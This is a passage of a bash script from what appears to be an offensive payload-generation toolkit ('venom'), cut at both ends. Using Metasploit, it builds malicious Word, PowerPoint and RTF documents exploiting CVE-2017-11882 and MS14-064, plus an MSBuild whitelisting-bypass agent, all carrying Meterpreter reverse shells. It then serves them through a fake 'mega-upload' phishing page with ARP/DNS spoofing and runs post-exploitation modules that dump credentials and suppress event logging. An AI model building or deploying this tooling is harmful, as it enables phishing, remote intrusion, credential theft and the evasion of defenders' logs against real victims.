
  # config rigth arch (payload+format)
  if [ "$Targ" = "WINDOWS" ]; then
    taa="0"
    orm="C"
    paa="windows/meterpreter/reverse_tcp"
  else
    taa="1"
    orm="PYTHON"
    paa="python/meterpreter/reverse_tcp"
  fi


# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : $orm -> $Targ
    | PAYLOAD : $paa
    |_AGENT   : $IPATH/output/$N4m.docm

!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] astrobaby.c -> found!"
      sleep 2
   else
      echo "[☠] astrobaby.c -> not found!"
      exit
   fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# building template (windows systems)
if [ "$Targ" = "WINDOWS" ]; then
echo "[☠] editing/backup files .."
cp $IPATH/templates/astrobaby.c $IPATH/templates/astrobaby[bk].c > /dev/nul 2>&1
cd $IPATH/templates
sed -i "s|LhOsT|$lhost|g" astrobaby.c
sed -i "s|lPoRt|$lport|g" astrobaby.c
# obfuscation ??
UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 150 | head -n 1)
sed -i "s|UUID-RANDOM|$UUID_1|g" astrobaby.c
sleep 2

# compiling template (windows systems)
echo "[☠] Compiling using mingw32 .."
sleep 2
# i686-w64-mingw32-gcc astr0baby.c -o payload.exe -lws2_32 -mwindows
$ComP astrobaby.c -o payload.exe -lws2_32 -mwindows
strip payload.exe > /dev/null 2>&1
mv payload.exe $IPATH/output/$N4m.exe > /dev/null 2>&1
echo "[☠] Binary: $IPATH/output/$N4m.exe .."
cd $IPATH
sleep 2
fi



# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
if [ "$Targ" = "WINDOWS" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set EXE::Custom $IPATH/output/$N4m.exe; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set BODY Please enable the Macro SECURITY WARNING in order to view the contents of the document; set target $taa; set PAYLOAD $paa; set LHOST $lhost; run; exit -y'" > /dev/null 2>&1
fi

mv $H0m3/.msf4/local/msf.docm $IPATH/output/$N4m.docm > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.docm .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.docm\n\nchose how to deliver: $N4m.docm" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'"
        fi
      sleep 2


   else


if [ "$Targ" = "WINDOWS" ]; then
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1
else
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "exploit_suggester.rc" --width 305 --height 200) > /dev/null 2>&1
fi


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.docm|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.docm $ApAcHe/$N4m.docm > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.docm|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.docm $ApAcHe/$N4m.docm
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/astrobaby[bk].c $IPATH/templates/astrobaby.c > /dev/nul 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/$N4m.docm > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}




# ---------------------------------------------------------------------
# ms14_064_packager_python
# Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013
# ---------------------------------------------------------------------
sh_world24 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: ms14_064" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ms14_064";fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PYTHON -> WINDOWS
    | PAYLOAD : python/meterpreter/reverse_tcp
    |_AGENT   : $IPATH/output/$N4m.ppsx

!

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $IPATH/templates/astrobaby.c ]; then
      echo "[☠] template -> found!"
      sleep 2
   else
      echo "[☠] template -> not found!"
      exit
   fi



# building template
echo "[☠] editing/backup files .."
sleep 2
if [ -e $H0m3/.msf4/local/$N4m.ppsx ]; then
rm $H0m3/.msf4/local/$N4m.ppsx > /dev/null 2>&1
fi


echo "[☠] Generating binary agent .."
sleep 2

# use metasploit to build shellcode
echo "[☠] Generating MS_word document .."
sleep 2
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfconsole -q -x 'use exploit/windows/fileformat/ms14_064_packager_python; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set FILENAME $N4m.ppsx; set LHOST $lhost; set LPORT $lport; run; exit -y'" > /dev/null 2>&1
mv $H0m3/.msf4/local/$N4m.ppsx $IPATH/output/$N4m.ppsx > /dev/null 2>&1
echo "[☠] MS_word agent: $IPATH/output/$N4m.ppsx .."
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ppsx\n\nchose how to deliver: $N4m.ppsx" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.ppsx|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ppsx $ApAcHe/$N4m.ppsx > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.ppsx|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ppsx $ApAcHe/$N4m.ppsx
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.ppsx > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}





# ---------------------------------------------------------------------
# CVE-2017-11882 (rtf word doc)
# ---------------------------------------------------------------------
sh_world25 () {
# get user input to build shellcode
echo "[☠] Enter exploit settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 370 --height 280) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ DOCUMENT NAME ☠" --text "Enter document output name\nexample: office" --width 300) > /dev/null 2>&1
sleep 1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$N4m" ]; then N4m="office";fi

# display final settings to user
cat << !

    exploit settings
    ╔─────────────────────
    | LHOST   : $lhost
    | CVE     : CVE-2017-11882
    | FORMAT  : ANCII/HEX -> MICROSOFT OFFICE (RTF)
    | PAYLOAD : $paylo
    |_AGENT   : $IPATH/output/$N4m.rtf

!
sleep 1
  #
  # check if all dependencies needed are installed
  #
  echo "[☠] Checking exploit installation .."
  sleep 1
  if [ -e $pHanTom/exploits/windows/fileformat/office_ms17_11882.rb ]; then
     echo "[✔] Exploit office_ms17_11882 -> found!"
     sleep 2
  else
     echo "[x] Exploit office_ms17_11882 -> not found!"
     sleep 2
     echo "[*] Please wait, installing required module .."
     sleep 2
     cp $IPATH/aux/msf/office_ms17_11882.rb $pHanTom/exploits/windows/fileformat/office_ms17_11882.rb
     echo "[*] Please wait, rebuilding msfdb .."
     sleep 1
     xterm -T " REBUILDING MSFBD " -geometry 145x26 -e "msfdb reinit" > /dev/null 2>&1
     echo "[*] Please wait, reloading all module paths .."
     sleep 1
     xterm -T " RELOADING ALL MODULE PATHS " -geometry 145x26 -e "msfconsole -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
     echo "[✔] Exploit office_ms17_11882.rb installed .."
     sleep 2
  fi



  #
  # build CVE-2017-11882 RTF agent ..
  #
  echo "[☠] Generating MS_office_word agent (rtf) .."
  sleep 2
  echo "[☠] Attack vector: http://$lhost:8080/doc"
  sleep 1
  cd $IPATH/output
  xterm -T " EXPLOIT CVE-2017-11882 (rtf) " -geometry 158x28 -e "msfconsole -x 'use exploit/windows/fileformat/office_ms17_11882; set LHOST $lhost; set PAYLOAD $paylo; set FILENAME $IPATH/output/$N4m.rtf; set URIPATH /doc; exploit'" > /dev/null 2>&1
  sleep 2



# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
# rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_world
  clear
fi
}







#
# Build csharp shellcode embbebed into one template.xml
# use MSBUILD.exe (appl_whitelisting_bypass) to run our template.xml
#
sh_shellcodecsharp () {
QuEs=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Msbuild (xml execution) by: @subTee ..\nThis agent requires MSBUILD.exe vuln binary\ninstalled in target system to exec agent.csproj\n\nRun MSbuild module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1
# chose agent final name
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1



echo "[☠] Loading msbuild appl_whitelisting_bypass"
sleep 1
# display final settings to user
echo "[☠] Building shellcode -> CSHARP format .."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : CSHARP -> WINDOWS(XML)
    | PAYLOAD : $paylo
    | VULN    : msbuild - Application_whitelisting_bypass
    |_DISCLOSURE : @subTee

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f csharp -o $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f csharp -o $IPATH/output/chars.raw"
fi



echo ""
#
# display generated code
#
cd $IPATH/output
echo "Unsigned char buf[]="
  cat chars.raw | egrep ',' | cut -d '}' -f1
echo "" && echo ""
sleep 2


#
# parsing shellcode data
#
echo "[☠] Parsing agent shellcode data .."
sleep 2
Embebed=`cat chars.raw | egrep ',' | cut -d '}' -f1 | tr -d '\n'`
store=`cat chars.raw | awk {'print $5'} | tr -d '\n'`



#
# embebbed shellcode into template.xml
#
echo "[☠] Inject shellcode into template.xml"
sleep 2
cd $IPATH/templates
cp template.xml template.bak > /dev/null 2>&1
sed -i "s/INSERT_SHELLCODE_HERE/$Embebed/g" template.xml
sed -i "s/ByT33/$store/g" template.xml
cp template.xml $IPATH/output/$N4m.csproj


#
# build installer.bat (exec template.xml)
#
echo "[☠] Build installer.bat (execute: $N4m.csproj)"
sleep 2
cp installer.bat installer.bak > /dev/null 2>&1
sed -i "s/RePlaC/$N4m/g" installer.bat
cp installer.bat $IPATH/output/installer.bat


#
# EXECUTE THE LISTENNER (HANDLER)
#
zenity --info --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.csproj\n$IPATH/output/installer.bat\n\nMsbuild (xml execution) by: @subTee ..\nThis agent requires MSBUILD.exe vuln binary\ninstalled in target system to exec $N4m.csproj\n\nREMARK: installer.bat and $N4m.csproj\nmust be in the same directory (remote)\n'installer.bat will execute $N4m.csproj'" --width 310 > /dev/null 2>&1

      #
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      #
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
